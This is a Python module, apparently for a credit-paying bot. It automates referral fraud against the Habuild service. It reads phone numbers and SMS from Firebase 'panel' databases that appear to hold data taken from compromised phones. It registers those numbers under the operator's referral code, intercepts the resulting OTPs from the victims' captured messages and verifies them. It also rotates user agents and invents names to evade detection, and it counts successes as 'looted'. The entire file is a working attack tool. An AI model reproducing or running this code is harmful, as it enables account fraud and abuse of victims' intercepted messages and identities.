# habuild_automation.py
import os
import re
import time
import uuid
import json
import random
import asyncio
import logging
from datetime import datetime
from typing import Optional, Dict, List, Set
import aiohttp
import sqlite3

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING,
)

# ==================== CONFIG ====================
FIRST_NAMES = ['Arjun', 'Aryan', 'Rohan', 'Vihaan', 'Shaurya', 'Advik', 'Kabir', 'Dhruv', 
               'Krishna', 'Aadhya', 'Ananya', 'Diya', 'Ishita', 'Kiara', 'Myra', 'Navya', 
               'Aarav', 'Ishaan', 'Kajal', 'Neha', 'Rahul', 'Vikram', 'Sneha', 'Pooja', 'Karan']
LAST_NAMES = ['Sharma', 'Verma', 'Gupta', 'Patil', 'Deshmukh', 'Singh', 'Kumar', 'Mishra', 
              'Joshi', 'Chauhan', 'Rajput', 'Yadav', 'Rathore', 'Mehta', 'Reddy', 'Nair']

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
]

MAX_NAME_COMBINATIONS = len(FIRST_NAMES) * len(LAST_NAMES)

# ==================== DATABASE FUNCTIONS ====================
DB_PATH = "viediet_bot.db"

def get_user_habuild_data(user_id: int) -> Dict:
    """Get user's Habuild settings from database"""
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS habuild_settings (
        user_id INTEGER PRIMARY KEY,
        referral_code TEXT,
        panels TEXT,
        is_running INTEGER DEFAULT 0,
        total_referrals INTEGER DEFAULT 0,
        last_run TEXT
    )''')
    conn.commit()
    
    c.execute('SELECT referral_code, panels, is_running, total_referrals FROM habuild_settings WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        return {
            'referral_code': row[0] or '',
            'panels': json.loads(row[1]) if row[1] else [],
            'is_running': bool(row[2]),
            'total_referrals': row[3] or 0
        }
    return {'referral_code': '', 'panels': [], 'is_running': False, 'total_referrals': 0}

def update_habuild_settings(user_id: int, referral_code: str = None, panels: list = None, is_running: bool = None):
    """Update user's Habuild settings"""
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS habuild_settings (
        user_id INTEGER PRIMARY KEY,
        referral_code TEXT,
        panels TEXT,
        is_running INTEGER DEFAULT 0,
        total_referrals INTEGER DEFAULT 0,
        last_run TEXT
    )''')
    conn.commit()
    
    current = get_user_habuild_data(user_id)
    new_ref = referral_code if referral_code is not None else current['referral_code']
    new_panels = json.dumps(panels) if panels is not None else json.dumps(current['panels'])
    new_running = int(is_running) if is_running is not None else int(current['is_running'])
    total = current['total_referrals']
    
    c.execute('''INSERT OR REPLACE INTO habuild_settings 
                 (user_id, referral_code, panels, is_running, total_referrals, last_run)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, new_ref, new_panels, new_running, total, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def increment_habuild_referrals(user_id: int):
    """Increment total referrals count"""
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute('UPDATE habuild_settings SET total_referrals = total_referrals + 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

# ==================== HABUILD AUTOMATION CLASS ====================
class HabuildAutomation:
    def __init__(self, user_id: int, bot_instance=None):
        self.user_id = user_id
        self.bot = bot_instance
        self.settings = get_user_habuild_data(user_id)
        self.referral_code = self.settings['referral_code']
        self.panels = self.settings['panels']
        self.is_running = False
        self._session = None
        self.seen_sms_ids = set()
        self.pending_otp = {}
        self.processed_nums = set()
        self.looted_count = 0
        self.used_names = set()
        self.api_cooldown_until = 0
        self._cached_devices = []
        
    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(limit=100, keepalive_timeout=60)
            self._session = aiohttp.ClientSession(connector=connector)
        return self._session
    
    def generate_indian_name(self):
        if len(self.used_names) >= MAX_NAME_COMBINATIONS - 5:
            self.used_names.clear()
        while True:
            name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
            if name not in self.used_names:
                self.used_names.add(name)
                return name
    
    def get_random_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,hi-IN;q=0.8,hi;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://portal.habuild.in",
            "Referer": "https://portal.habuild.in/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "Connection": "keep-alive"
        }
    
    async def fb_get(self, path: str, base: str) -> Optional[dict]:
        try:
            session = await self.get_session()
            url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status != 200: return None
                data = await r.json(content_type=None)
                return data if isinstance(data, dict) else None
        except Exception:
            return None
    
    def extract_all_nums(self, *dicts) -> list:
        nums = []
        keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "mobile"]
        for d in dicts:
            if not isinstance(d, dict): continue
            for k in keys_to_check:
                val = str(d.get(k, ""))
                if val and len(re.sub(r"\D", "", val)) > 9:
                    clean = re.sub(r"\D", "", val)
                    if len(clean) >= 10: nums.append(clean[-10:])
        return list(set(nums))
    
    async def fetch_db_data(self, url: str) -> list:
        devices_list = []
        try:
            sim_all, device_info_all, user_data_all = await asyncio.gather(
                self.fb_get("All_Users/simDetails", url),
                self.fb_get("All_Users/Data/DeviceInfo", url),
                self.fb_get("user_data", url),
                return_exceptions=True
            )
            
            if isinstance(sim_all, dict):
                info_all = device_info_all if isinstance(device_info_all, dict) else {}
                for dev_id, sim in sim_all.items():
                    info = info_all.get(dev_id) or {}
                    nums = self.extract_all_nums(sim, info)
                    status = "online" if str(info.get("Status")).lower() == "online" else "offline"
                    devices_list.append({
                        "id": dev_id, 
                        "numbers": nums, 
                        "status": status, 
                        "base": url, 
                        "path": f"All_Users/sms/{dev_id}"
                    })
                    
            if isinstance(user_data_all, dict):
                for dev_id, data in user_data_all.items():
                    if not isinstance(data, dict): continue
                    nums = self.extract_all_nums(data)
                    status = "online" if str(data.get("status")).lower() == "online" else "offline"
                    devices_list.append({
                        "id": dev_id, 
                        "numbers": nums, 
                        "status": status, 
                        "base": url, 
                        "path": f"user_sms/{dev_id}"
                    })
        except Exception:
            pass
        return devices_list
    
    async def trigger_registration(self, phone_10d: str, worker_id: int):
        if not self.referral_code:
            return
            
        if time.time() < self.api_cooldown_until:
            return

        phone_full = f"+91{phone_10d}"
        name = self.generate_indian_name()
        device_id = str(uuid.uuid4())
        session_id = str(uuid.uuid4())

        reg_url = "https://auth-service.habuild.in/public/user/v1/register-user"
        reg_payload = {
            "name": name,
            "phoneNumber": phone_full,
            "referredBy": self.referral_code,
            "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"},
            "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}
        }

        try:
            session = await self.get_session()
            headers = self.get_random_headers()
            
            async with session.post(reg_url, json=reg_payload, headers=headers, timeout=12) as r:
                if r.status == 429:
                    self.api_cooldown_until = time.time() + 20
                    return
                res = await r.json()
                if res.get('message') == 'success':
                    log_url = "https://auth-service.habuild.in/public/auth/v1/login"
                    log_payload = {
                        "method": "phone_otp",
                        "otpChannel": "sms",
                        "phoneNumber": phone_full,
                        "sourceData": {"type": "portal", "utm_source": "whatsapp"},
                        "experimentMetaInfo": {"deviceId": device_id, "sessionId": str(uuid.uuid4())},
                        "registerUser": False
                    }
                    async with session.post(log_url, json=log_payload, headers=headers, timeout=12) as lr:
                        if lr.status == 429:
                            self.api_cooldown_until = time.time() + 20
                            return
                        lres = await lr.json()
                        if lres.get('message') == 'OTP sent to your phone':
                            ref_code = lres.get('data', {}).get('refrence_code')
                            self.pending_otp[phone_10d] = {
                                "phone": phone_full,
                                "otp_ref": ref_code,
                                "device_id": device_id,
                                "name": name
                            }
                            if self.bot:
                                await self.bot.send_message(
                                    self.user_id,
                                    f"⚡ OTP Requested: {phone_10d} | Name: {name}"
                                )
        except Exception:
            pass
    
    async def verify_otp(self, phone_10d: str, otp: str):
        data = self.pending_otp.pop(phone_10d, None)
        if not data: return

        url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
        payload = {
            "phone": data['phone'],
            "reference_code": data['otp_ref'],
            "otp": otp,
            "experimentMetaInfo": {"deviceId": data['device_id'], "sessionId": str(uuid.uuid4())},
            "registerUser": False
        }
        try:
            session = await self.get_session()
            headers = self.get_random_headers()
            
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            async with session.post(url, json=payload, headers=headers, timeout=12) as r:
                res = await r.json()
                if res.get('message') == 'OTP verified successfully':
                    self.looted_count += 1
                    increment_habuild_referrals(self.user_id)
                    member = res.get('data', {}).get('member', {})
                    
                    # Give coins to user for successful referral
                    from main import update_user_balance, get_module_cost
                    cost = get_module_cost("habuild")
                    update_user_balance(self.user_id, cost)
                    
                    succ_msg = (
                        f"🏆 Habuild Referral Successful!\n\n"
                        f"📱 Number: {data['phone']}\n"
                        f"👤 Name: {member.get('name', data['name'])}\n"
                        f"🆔 Member ID: {member.get('legacy_free_id', 'N/A')}\n"
                        f"🎁 Referral Code: {self.referral_code}\n"
                        f"✅ OTP: {otp}\n\n"
                        f"💰 Rewarded: +{cost} Credits\n"
                        f"🏆 Total Referrals: {self.looted_count}"
                    )
                    if self.bot:
                        await self.bot.send_message(self.user_id, succ_msg)
        except Exception:
            pass
    
    async def _forward_sms(self, device: dict, sms: dict):
        body = str(sms.get("body") or sms.get("message") or sms.get("text") or "")
        sender = str(sms.get("sender") or "")

        otp_match = re.search(r"\b(\d{6})\b", body)
        if otp_match and ("HABUILD" in sender.upper() or "Habuild" in body):
            otp = otp_match.group(1)
            for num in device.get("numbers", []):
                if num in self.pending_otp:
                    asyncio.create_task(self.verify_otp(num, otp))
                    break
    
    async def poll_single_db(self, url: str):
        try:
            r_main, r_user = await asyncio.gather(
                self.fb_get("All_Users/sms", url),
                self.fb_get("user_sms", url),
                return_exceptions=True
            )
            
            for bulk_data in (r_main, r_user):
                if not isinstance(bulk_data, dict): continue
                for dev_id, sms_dict in bulk_data.items():
                    if not isinstance(sms_dict, dict): continue
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = f"{dev_id}/{k}"
                        if sk in self.seen_sms_ids: continue
                        self.seen_sms_ids.add(sk)
                        
                        device = None
                        for d in self._cached_devices or []:
                            if d["id"] == dev_id:
                                device = d
                                break
                        if device:
                            await self._forward_sms(device, sms)
        except Exception:
            pass
    
    async def update_cache_loop(self):
        self._cached_devices = []
        while self.is_running:
            try:
                all_devices = []
                for url in self.panels:
                    devices = await self.fetch_db_data(url)
                    all_devices.extend(devices)
                
                self._cached_devices = all_devices
                
                for dev in all_devices:
                    if dev.get("status") == "online":
                        for num in dev.get("numbers", []):
                            if (num not in self.processed_nums and 
                                num not in self.pending_otp):
                                self.processed_nums.add(num)
                                await self.trigger_registration(num, 1)
                                
            except Exception:
                pass
            await asyncio.sleep(4)
    
    async def poll_loop(self):
        while self.is_running:
            tasks = [self.poll_single_db(url) for url in self.panels]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(2)
    
    async def start_automation(self):
        if not self.referral_code:
            return {"status": "error", "message": "Please set your Habuild referral code first!"}
        if not self.panels:
            return {"status": "error", "message": "Please add at least one Firebase panel URL!"}
        
        self.is_running = True
        update_habuild_settings(self.user_id, is_running=True)
        
        asyncio.create_task(self.update_cache_loop())
        asyncio.create_task(self.poll_loop())
        
        return {"status": "success", "message": f"Automation started! Monitoring {len(self.panels)} panels."}
    
    async def stop_automation(self):
        self.is_running = False
        update_habuild_settings(self.user_id, is_running=False)
        if self._session:
            await self._session.close()
        return {"status": "success", "message": "Automation stopped."}
    
    def get_stats(self):
        return {
            "panels": len(self.panels),
            "total_referrals": self.looted_count + self.settings.get('total_referrals', 0),
            "pending_otp": len(self.pending_otp),
            "processed_numbers": len(self.processed_nums),
            "is_running": self.is_running,
            "referral_code": self.referral_code
        }

# ==================== GLOBAL INSTANCE ====================
user_automations: Dict[int, HabuildAutomation] = {}
